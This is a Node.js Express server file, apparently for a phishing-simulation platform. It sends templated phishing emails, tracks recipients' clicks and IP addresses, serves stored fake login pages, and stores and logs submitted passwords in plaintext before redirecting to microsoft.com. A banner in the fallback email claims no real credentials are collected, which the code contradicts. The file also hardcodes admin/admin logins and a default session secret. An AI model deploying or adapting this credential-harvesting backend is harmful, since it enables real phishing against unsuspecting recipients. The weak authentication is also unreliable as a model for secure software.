const mongoose = require("mongoose");
const PhishingClick = require("./models/PhishingClick");
const CapturedCredential = require("./models/CapturedCredential");
const emailTemplateRoutes = require("./routes/emailTemplates");
const loginPageRoutes = require("./routes/loginPages");
const EmailTemplate = require("./models/EmailTemplate");
const LoginPage = require("./models/LoginPage");

require("dotenv").config();
const express = require("express");
const cors = require("cors");
const session = require("express-session");
const nodemailer = require("nodemailer");
const axios = require("axios");
const cheerio = require("cheerio");
const path = require("path"); // ✅ Needed to serve React build
const fs = require("fs"); // Added to check if build exists

const app = express();
// Trust first proxy (needed for secure cookies behind proxies like ngrok)
app.set("trust proxy", 1);
app.use(express.static("public"));
// CORS setup: allow ngrok and localhost origins from .env
const allowedOrigins = process.env.ALLOWED_ORIGINS
  ? process.env.ALLOWED_ORIGINS.split(",")
  : [
      "http://localhost:3000",
      "http://localhost:5000"
    ];
app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      const msg = `The CORS policy for this site does not allow access from the specified Origin: ${origin}`;
      return callback(new Error(msg), false);
    }
    return callback(null, true);
  },
  credentials: true,
}));
app.use(express.json());

// Root endpoint for health/status
app.get("/api/status", (req, res) => {
  res.json({ status: "Phishing-Sim API is running ✅" });
});

// Session configuration
app.use(
  session({
    secret: process.env.SESSION_SECRET || "phishing-sim-secret-key",
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: true, // Always true for HTTPS (ngrok)
      sameSite: "none", // Allow cross-site cookies
      maxAge: 24 * 60 * 60 * 1000, // 24 hours
    },
  }),
);

// Email template routes
app.use("/api/email-templates", emailTemplateRoutes);
// Login page routes
app.use("/api/login-pages", loginPageRoutes);

// Authentication middleware
const requireAuth = (req, res, next) => {
  if (req.session && req.session.user) {
    next();
  } else {
    res.status(401).json({ error: "Authentication required" });
  }
};

// Users database (in production, use proper database)
const users = {
  admin: { username: "admin", password: "admin", role: "admin" },
  user: { username: "user", password: "Hizan@007", role: "user" },
};

// Login endpoint
app.post("/api/auth/login", (req, res) => {
  const { username, password } = req.body;

  if (users[username] && users[username].password === password) {
    req.session.user = {
      username: users[username].username,
      role: users[username].role,
    };
    res.json({
      success: true,
      user: req.session.user,
      message: "Login successful",
    });
  } else {
    res.status(401).json({ error: "Invalid username or password" });
  }
});

// Logout endpoint
app.post("/api/auth/logout", (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      res.status(500).json({ error: "Could not log out" });
    } else {
      res.json({ success: true, message: "Logout successful" });
    }
  });
});

// Get current user endpoint
app.get("/api/auth/user", (req, res) => {
  if (req.session && req.session.user) {
    res.json({ user: req.session.user });
  } else {
    res.status(401).json({ error: "Not authenticated" });
  }
});

// Connect to MongoDB
mongoose
  .connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.error("❌ MongoDB error:", err));

const PORT = process.env.PORT || 5000;

// Configure Email Transporter
const BASE_URL = process.env.BASE_URL || "http://localhost:5000";
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || "smtp.gmail.com",
  port: process.env.SMTP_PORT || 587,
  secure: false,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// API Endpoint to Send Phishing Email
app.post("/send-phishing-email", requireAuth, async (req, res) => {
  const { recipientEmail, templateId, loginPageId } = req.body;

  if (!recipientEmail) {
    return res.status(400).json({ error: "Recipient email is required" });
  }

  try {
        let emailContent;
    let emailSubject = "Important Security Alert";

    if (templateId) {
      try {
        const template = await EmailTemplate.findById(templateId);
        if (!template) {
          return res.status(400).json({ error: "Invalid templateId" });
        }
        emailSubject = template.subject;
        // Replace placeholder {{verification_link}} in template content
        emailContent = template.content;
        let trackingLink = `${BASE_URL}/track-click?email=${encodeURIComponent(recipientEmail)}`;
        if (loginPageId) {
          trackingLink += `&page=${loginPageId}`;
        }
        if (/{{\s*verification_link\s*}}/i.test(emailContent)) {
          emailContent = emailContent.replace(/{{\s*verification_link\s*}}/gi, trackingLink);
        } else {
          // If no placeholder, append a default call-to-action block
          emailContent += `\n<p style="margin-top:16px"><a href="${trackingLink}">Verify your account</a></p>`;
        }
      } catch (err) {
        console.error("Error fetching template", err);
        return res.status(500).json({ error: "Failed to fetch template" });
      }
    }

    // Fallback to default content
    if (!emailContent) {
      emailContent = `
        <div style="background: #fff3cd; color: #856404; text-align: center; padding: 10px; font-size: 14px; font-weight: 500; border-bottom: 1px solid #ffeeba;">
          This email is part of a <strong>simulated phishing campaign for educational purposes only</strong>. No real credentials are being collected.
        </div>
        <p>Hello,</p>
        <p>We detected unusual login activity in your account. Please <a href=\"${BASE_URL}/track-click?email=${recipientEmail}\">click here to verify</a>.</p>
        <p>Thank you,<br/>Security Team</p>
      `;
    }

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: recipientEmail,
      subject: emailSubject,
      html: emailContent,
    };

    await transporter.sendMail(mailOptions);
    res.json({ message: "Phishing email sent successfully!" });
  } catch (error) {
    console.error("Error sending phishing email:", error);
    res.status(500).json({ error: "Failed to send email" });
  }
});

// API Endpoint to Track Clicks on Phishing Links
app.get("/track-click", async (req, res) => {
  const { email } = req.query;

  if (!email) {
    return res.status(400).json({ error: "Email is required" });
  }

  try {
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // ✅ Only create a record if it doesn't exist already for this email
    const alreadyClicked = await PhishingClick.findOne({ email });

    if (!alreadyClicked) {
      await PhishingClick.create({ email, ipAddress: ip });
    }

    const redirectUrl = req.query.page
      ? `${BASE_URL}/login/${req.query.page}`
      : `${BASE_URL}/login.html`;
    res.redirect(redirectUrl);
  } catch (error) {
    console.error(error);
    res.status(500).send("Error tracking click");
  }
});

// Get all phishing click data
app.get("/clicks", requireAuth, async (req, res) => {
  try {
    const clicks = await PhishingClick.find().sort({ timestamp: -1 });
    res.json(clicks);
  } catch (error) {
    console.error("Error fetching clicks:", error);
    res.status(500).json({ error: "Failed to fetch click data" });
  }
});

// Get all captured credentials
app.get("/credentials", requireAuth, async (req, res) => {
  try {
    const credentials = await CapturedCredential.find().sort({ timestamp: -1 });
    res.json(credentials);
  } catch (error) {
    console.error("Error fetching credentials:", error);
    res.status(500).json({ error: "Failed to fetch credentials" });
  }
});

// API Endpoint to Save Submitted Credentials
app.post("/submit-credentials", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Email and password required" });
  }

  try {
    await CapturedCredential.findOneAndUpdate(
      { email }, // Match by email
      {
        $set: { password, timestamp: new Date() }, // Update password and timestamp
      },
      { upsert: true, new: true }, // Insert if not found
    );

    console.log("Captured credentials saved/updated:", { email, password });
    res.redirect("https://www.microsoft.com");
  } catch (err) {
    console.error("Error saving credentials:", err);
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/api/phishing-clicks", async (req, res) => {
  try {
    const clicks = await PhishingClick.find().sort({ timestamp: -1 }); // latest first
    res.json(clicks);
  } catch (error) {
    console.error("Error fetching click data:", error);
    res.status(500).json({ error: "Failed to fetch click data" });
  }
});

// ✅ Serve React frontend build files if the build folder exists
const buildPath = path.join(__dirname, "phishing-sim-ui", "build");
if (fs.existsSync(buildPath)) {
  console.log("Serving React build from", buildPath);
  app.use(express.static(buildPath));

  // Serve index.html only for paths that don't contain a file extension (i.e. likely client-side routed URLs)
  app.get('*', (req, res, next) => {
    if (path.extname(req.path) === '') {
      return res.sendFile(path.join(buildPath, 'index.html'));
    }
    // If the request has a file extension, let express.static handle it (or fallthrough to 404)
    return next();
  });
} else {
  console.log("React build not found—running in API-only mode");
}

// Serve stored login page by id
app.get("/login/:id", async (req, res) => {
  try {
    const page = await LoginPage.findById(req.params.id);
    if (!page) return res.status(404).send("Login page not found");

    // Simple CSP header to allow inline styles in stored HTML
    res.setHeader("Content-Security-Policy", "default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval'");
    res.send(page.html);
  } catch (err) {
    console.error("Error serving login page", err);
    res.status(500).send("Server error");
  }
});

// Start Server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
